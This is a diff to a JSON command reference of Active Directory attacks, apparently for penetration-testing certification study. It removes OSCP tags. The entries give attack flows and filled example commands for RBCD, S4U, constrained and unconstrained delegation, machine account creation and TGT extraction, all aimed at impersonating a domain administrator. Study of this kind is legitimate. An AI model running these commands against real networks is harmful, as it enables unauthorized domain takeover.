@@ -43,8 +43,7 @@
         "RBCD",
         "DELEGATION",
         "PRIVILEGE_ESCALATION",
-        "LINUX",
-        "OSCP:HIGH"
+        "LINUX"
       ],
       "flag_explanations": {
         "-delegate-from": "Account that will be allowed to delegate (your controlled account)",
@@ -70,8 +69,7 @@
       "troubleshooting": {
         "Access denied": "User lacks GenericWrite/WriteDacl on target computer"
       },
-      "notes": "RBCD (RESOURCE-BASED CONSTRAINED DELEGATION):\nAllows impersonation to specific services on target computer.\n\nATTACK FLOW:\n1. Find target where you have GenericWrite/WriteDacl (BloodHound)\n2. Create/use machine account you control (requires MAQ > 0 or existing)\n3. Set RBCD: rbcd.py -delegate-from YOURPC$ -delegate-to TARGET$\n4. Get ticket: getST.py -spn cifs/TARGET -impersonate administrator\n5. Use ticket: psexec.py -k TARGET\n\nREQUIRES:\n- GenericWrite/WriteDacl/GenericAll on target computer\n- A machine account you control (create with addcomputer.py)\n- Target computer must have unconstrained delegation OR you use S4U2Self\n\nOSCP TIP:\nRBCD is extremely common in OSCP labs. Look for GenericWrite on computers.",
-      "oscp_relevance": "high",
+      "notes": "RBCD (RESOURCE-BASED CONSTRAINED DELEGATION):\nAllows impersonation to specific services on target computer.\n\nATTACK FLOW:\n1. Find target where you have GenericWrite/WriteDacl (BloodHound)\n2. Create/use machine account you control (requires MAQ > 0 or existing)\n3. Set RBCD: rbcd.py -delegate-from YOURPC$ -delegate-to TARGET$\n4. Get ticket: getST.py -spn cifs/TARGET -impersonate administrator\n5. Use ticket: psexec.py -k TARGET\n\nREQUIRES:\n- GenericWrite/WriteDacl/GenericAll on target computer\n- A machine account you control (create with addcomputer.py)\n- Target computer must have unconstrained delegation OR you use S4U2Self\n\ncertification TIP:\nRBCD is extremely common in certification labs. Look for GenericWrite on computers.",
       "filled_example": "python3 rbcd.py -delegate-from 'YOURPC$' -delegate-to 'DC01$' -action write 'corp.local/user:P@ssw0rd123!'"
     },
     {
@@ -118,8 +116,7 @@
         "S4U",
         "KERBEROS",
         "DELEGATION",
-        "LINUX",
-        "OSCP:HIGH"
+        "LINUX"
       ],
       "flag_explanations": {
         "-spn": "Service Principal Name for the target service (cifs/host for file share access)",
@@ -149,7 +146,6 @@
         "KDC_ERR_S_PRINCIPAL_UNKNOWN": "SPN not found - check target FQDN spelling"
       },
       "notes": "S4U ATTACKS:\nS4U2Self: Request ticket to self on behalf of any user (gets forwardable ticket)\nS4U2Proxy: Use forwardable ticket to access target service\n\nAFTER GETTING TICKET:\nexport KRB5CCNAME=/path/to/ticket.ccache\nimpacket-psexec -k -no-pass <target>\n\nOR:\nimpacket-psexec -k -no-pass <domain>/<impersonated_user>@<target>",
-      "oscp_relevance": "high",
       "filled_example": "impacket-getST -spn 'cifs/dc01.corp.local' -impersonate 'administrator' 'corp.local/YOURPC$' -hashes ':aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'"
     },
     {
@@ -190,8 +186,7 @@
         "S4U",
         "KERBEROS",
         "DELEGATION",
-        "WINDOWS",
-        "OSCP:HIGH"
+        "WINDOWS"
       ],
       "flag_explanations": {
         "/user": "Account performing the delegation (your machine account)",
@@ -221,7 +216,6 @@
         "KDC_ERR_TGT_REVOKED": "Account disabled or password changed"
       },
       "notes": "RUBEUS S4U:\nWindows equivalent of impacket-getST.\n\n/ptt automatically injects ticket.\n/altservice:host,http,ldap gets tickets for multiple services.",
-      "oscp_relevance": "high",
       "filled_example": "Rubeus.exe s4u /user:YOURPC$ /rc4:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 /impersonateuser:administrator /msdsspn:cifs/dc01.corp.local /ptt"
     },
     {
@@ -267,8 +261,7 @@
         "CONSTRAINED_DELEGATION",
         "S4U",
         "KERBEROS",
-        "LINUX",
-        "OSCP:HIGH"
+        "LINUX"
       ],
       "flag_explanations": {
         "-spn": "Target SPN from AllowedToDelegateTo attribute",
@@ -293,7 +286,6 @@
         "KDC_ERR_BADOPTION": "Account not configured for constrained delegation"
       },
       "notes": "CONSTRAINED DELEGATION:\nAccount has msDS-AllowedToDelegateTo set - can impersonate ANY user to those SPNs.\n\nFIND TARGETS:\nBloodHound: delegation-constrained-abuse query\nLDAP: msDS-AllowedToDelegateTo attribute on user/computer\n\nSPN ALTERNATIVE:\nService portion of SPN is arbitrary - cifs/host and http/host use same key.\nUse /altservice in Rubeus to get tickets for services not in AllowedToDelegateTo.",
-      "oscp_relevance": "high",
       "filled_example": "impacket-getST -spn 'cifs/dc01.corp.local' -impersonate 'administrator' 'corp.local/svc_sql' -hashes ':aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'"
     },
     {
@@ -316,8 +308,7 @@
         "UNCONSTRAINED_DELEGATION",
         "TGT",
         "KERBEROS",
-        "WINDOWS",
-        "OSCP:HIGH"
+        "WINDOWS"
       ],
       "flag_explanations": {
         "monitor": "Continuously monitor for new TGTs in LSASS",
@@ -342,8 +333,7 @@
       "troubleshooting": {
         "Access denied": "Need admin rights on unconstrained delegation host"
       },
-      "notes": "UNCONSTRAINED DELEGATION ATTACK:\nHosts with TrustedForDelegation cache TGTs of connecting users.\n\nATTACK FLOW:\n1. Compromise host with unconstrained delegation\n2. Run Rubeus monitor to watch for TGTs\n3. Coerce high-value target (DC) to authenticate to us\n4. Capture TGT and use for impersonation\n\nCOERCION METHODS:\nPetitPotam, PrinterBug, Coercer - force DC to authenticate.\n\nOSCP TIP:\nLook for 'YOURPC' \u2192 'TrustedForDelegation: True' in BloodHound.",
-      "oscp_relevance": "high",
+      "notes": "UNCONSTRAINED DELEGATION ATTACK:\nHosts with TrustedForDelegation cache TGTs of connecting users.\n\nATTACK FLOW:\n1. Compromise host with unconstrained delegation\n2. Run Rubeus monitor to watch for TGTs\n3. Coerce high-value target (DC) to authenticate to us\n4. Capture TGT and use for impersonation\n\nCOERCION METHODS:\nPetitPotam, PrinterBug, Coercer - force DC to authenticate.\n\ncertification TIP:\nLook for 'YOURPC' \u2192 'TrustedForDelegation: True' in BloodHound.",
       "filled_example": "Rubeus.exe monitor /interval:5 /nowrap /targetuser:DC01$"
     },
     {
@@ -389,8 +379,7 @@
         "ACTIVE_DIRECTORY",
         "RBCD",
         "MACHINE_ACCOUNT",
-        "LINUX",
-        "OSCP:HIGH"
+        "LINUX"
       ],
       "flag_explanations": {
         "-computer-name": "Name for the new machine account (include $ suffix)",
@@ -414,7 +403,6 @@
         "Access denied": "User cannot create machine accounts"
       },
       "notes": "MACHINE ACCOUNT CREATION:\nBy default, domain users can create up to 10 machine accounts (ms-DS-MachineAccountQuota).\n\nFOR RBCD:\n1. Create machine account you control\n2. Use its hash for S4U attack\n\nGET HASH:\nimpacket-secretsdump '<DOMAIN>/<NEW_COMPUTER>$:<PASSWORD>@<DC_IP>'\n\nOR compute hash:\npython3 -c \"import hashlib; print(hashlib.new('md4', 'Password123!'.encode('utf-16le')).hexdigest())\"",
-      "oscp_relevance": "high",
       "filled_example": "impacket-addcomputer -computer-name 'YOURPC$' -computer-pass 'Password123!' -dc-ip 192.168.50.70 'corp.local/user:Password123!'"
     },
     {
@@ -465,8 +453,7 @@
         "ACTIVE_DIRECTORY",
         "RBCD",
         "BLOODYAD",
-        "LINUX",
-        "OSCP:HIGH"
+        "LINUX"
       ],
       "flag_explanations": {
         "-d": "Domain name",
@@ -493,7 +480,6 @@
         "Access denied": "Insufficient permissions on target"
       },
       "notes": "BLOODYAD:\nMulti-purpose AD exploitation tool.\n\nAlternative to rbcd.py for RBCD configuration.",
-      "oscp_relevance": "high",
       "filled_example": "bloodyAD -d 'corp.local' -u 'user' -p 'P@ssw0rd123!' --host '192.168.50.70' set object 'DC01$' msDS-AllowedToActOnBehalfOfOtherIdentity -v 'S-1-5-21-...'"
     },
     {
@@ -508,8 +494,7 @@
         "ACTIVE_DIRECTORY",
         "KERBEROS",
         "TGT",
-        "WINDOWS",
-        "OSCP:MEDIUM"
+        "WINDOWS"
       ],
       "flag_explanations": {
         "tgtdeleg": "Request forwardable TGT using delegation trick",
@@ -530,8 +515,7 @@
       "troubleshooting": {
         "Unable to get delegation TGT": "No service in domain allows delegation"
       },
-      "notes": "TGT DELEGATION TRICK:\nRequests TGT by abusing Kerberos delegation.\n\nUse this when:\n- You have shell but no credentials\n- Want to extract current user's TGT for use elsewhere\n- sekurlsa::logonpasswords doesn't return hashes (credential guard)",
-      "oscp_relevance": "medium"
+      "notes": "TGT DELEGATION TRICK:\nRequests TGT by abusing Kerberos delegation.\n\nUse this when:\n- You have shell but no credentials\n- Want to extract current user's TGT for use elsewhere\n- sekurlsa::logonpasswords doesn't return hashes (credential guard)"
     }
   ]
 }
